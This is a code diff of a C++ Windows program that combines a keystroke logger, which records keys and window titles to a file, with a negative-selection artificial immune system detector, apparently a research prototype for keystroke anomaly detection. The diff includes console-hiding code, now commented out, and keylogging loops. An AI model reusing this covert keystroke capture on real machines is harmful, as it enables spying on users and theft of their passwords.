@@ -30,22 +30,23 @@ void detectorAIS();
 void keylogger();
 
 int main(int argc, char *argv[]){
-	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
-	puts(PROJECT_COPYRIGHT);
-	puts("");
-	detectorAIS();
+//	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
+//	puts(PROJECT_COPYRIGHT);
+//	puts("");
+	
 #ifndef TEST
 	char path[260];
 
     GetModuleFileName(NULL,path,260);
 
-    HWND console = FindWindow("ConsoleWindowClass",path);
+//    HWND console = FindWindow("ConsoleWindowClass",path);
 
-    if(IsWindow(console))
-
-    ShowWindow(console,SW_HIDE); // hides the 
+//    if(IsWindow(console))
+//		ShowWindow(console,SW_HIDE); // hides the 
 #endif 
 	//SHORT lastc = 0;
+	detectorAIS();
+	return 0;
 	char filepath[MAX_PATH];
 	getNameOutputFile(filepath);
 	ofstream klogout(filepath);
@@ -59,8 +60,9 @@ int main(int argc, char *argv[]){
 		
 		HWND hwndHandle = GetForegroundWindow();
 		GetWindowText(hwndHandle, stitle, 1023);
+		/*
 		title=shortTitle(stitle);
-		if(lastTitle != title){		
+		if(lastTitle != title){
 			if(title.size() == 0){
 				klogout << endl << "NO_ACTIVE ";
 #ifdef DEBUG
@@ -73,6 +75,15 @@ int main(int argc, char *argv[]){
 #endif		
 				//lastc = c;
 			}
+		}
+		*/
+		// logging keys, thats the keylogger
+		int c = keyPressed();
+				
+		if(c!=0){
+			klogout<<c<<" ";
+			cout<<c<<" ";
+			klogout.flush();
 		}
 	}
 	
@@ -134,22 +145,10 @@ int keyPressed(){
 				out = "[TAB]";
 			else if(c == 27)
 				out = "[ESC]";
-			else if(c == 33)
-				out = "[PAGE UP]";
-			else if(c == 34)
-				out = "[PAGE DOWN]";
 			else if(c == 35)
 				out = "[HOME]";
 			else if(c == 36)
 				out = "[POS1]";
-			else if(c == 37)
-				out = "[ARROW LEFT]";
-			else if(c == 38)
-				out = "[ARROW UP]";
-			else if(c == 39)
-				out = "[ARROW RIGHT]";
-			else if(c == 40)
-				out = "[ARROW DOWN]";
 			else if(c == 45)
 				out = "[INS]";
 			else if(c == 46)
@@ -197,7 +196,7 @@ int keyPressed(){
 				c=0;
 			}
 		#ifdef DEBUG
-			cout << out;
+//			cout << out;
 		#endif
 		return c;
 		}
@@ -206,27 +205,33 @@ int keyPressed(){
 }
 
 void detectorAIS(){
-	map<string,vector<int> > self;
+	vector<char> self;
 	map<int,string> keys;
 	string title,lastTitle,url = "dataset.data";
-	int tamMuestra,lenPalabra;
-	vector<int> currentInput;
+	vector<char> currentInput;
 	
-	readData(url,self);
-	
+	readVector(url,self);
+	cerr<<"datos leidos "<<self.size()<<":\n";
+//	for(char c: self){
+//		cout<<(int)c<<" ";//<<it->second;
+//	}
 	keys = getKeys();
 	
 	int r,detectorSize,strSize;
 	
-	r=5;
-	detectorSize=100;
-	strSize=10;
-	tamMuestra=200;
+	r=2;
+	detectorSize=100000;
+	strSize=3;
 	
-	vector<string> nonself,selfvec = convertir(self);
-	currentInput = obtenerMuestra(currentInput,tamMuestra,lenPalabra);
+	vector<string> nonself,selfvec = convertir(self,strSize);
+	cerr<<"selfvec: "<<selfvec.size()<<"\n";
 	GenericNegativeSelection gns(r,detectorSize,strSize);
+	
+//	cerr<<"construc\n";
+////	printData(selfvec);
 	vector<string> repertories = gns.generatingRepertoire( selfvec );
+	printf("repertories: %d\n",repertories.size());
+	int detecTime=10,i = 0;
 	while(1){
 		Sleep(2); // give other programs time to run
 		
@@ -236,22 +241,27 @@ void detectorAIS(){
 		HWND hwndHandle = GetForegroundWindow();
 		GetWindowText(hwndHandle, stitle, 1023);
 		title=shortTitle(stitle);
-		if(lastTitle != title){		
+		if(lastTitle != title){
 			lastTitle = title;
-//			Detection time
+		}
+		if(i%detecTime==0){
+	//		Detection time
 			nonself = gns.censoring(selfvec,repertories);
-
+			printf("nonself: %d\n",nonself.size());
 			for(string i:nonself){
 				cout<<i;
 			}cout<<endl;
+			i=0;
 		}
-		
 		// logging keys, thats the keylogger
 		int c = keyPressed();
 				
 		if(c!=0){
 			currentInput.push_back(c);
+			i++;
 		}
+		
 	}
 }
-void keylogger();
+void keylogger(){
+}
